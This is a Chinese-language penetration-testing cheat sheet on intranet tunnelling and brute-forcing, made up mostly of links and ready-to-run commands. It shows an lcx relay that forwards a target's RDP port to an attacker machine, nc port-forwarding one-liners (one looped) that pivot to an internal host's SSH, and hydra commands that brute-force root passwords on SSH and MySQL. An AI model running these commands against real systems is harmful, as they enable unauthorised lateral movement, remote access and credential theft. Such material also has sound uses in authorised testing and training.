

## 内网穿透
[Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
frp/nps

[tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)

-- for xp/2003
3proxy 7.x / CCProxy
nc
[lcx](https://github.com/UndefinedIdentifier/LCX)

[内网渗透中隧道渗透技术](https://blog.csdn.net/qq_17204441/article/details/88834324)
[内网渗透之主机出网OR不出网隧道搭建](https://www.freebuf.com/articles/web/255801.html)
### lcx
```bash
靶机执行
Lcx.exe -slave 192.168.100.3 12345 192.168.100.128 3389 (把攻击机的12346数据 传递给靶机的3389)
攻击机执行
Lcx.exe -listen 12345 12346 (把攻击机12345端口接收到的数据转发到哦12346端口)
```
### nc
[nc端口转发](https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/)
```bash
# 跳板机: 8888 转到 153 的 22端口上
nc -l -p 8888 -c "nc 192.168.19.153 22"
```

自动循环连接
```bash
while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
```


## 爆破

### hydra

__ssh__

sudo hydra -l root -P wordlist.TXT ssh：//192.168.136.142

__mysql__

hydra -l root -P ./password.txt -t 1 -e n -f -v 192.168.43.17 mysql
hydra -l root -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql
hydra -L ./user.txt -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql
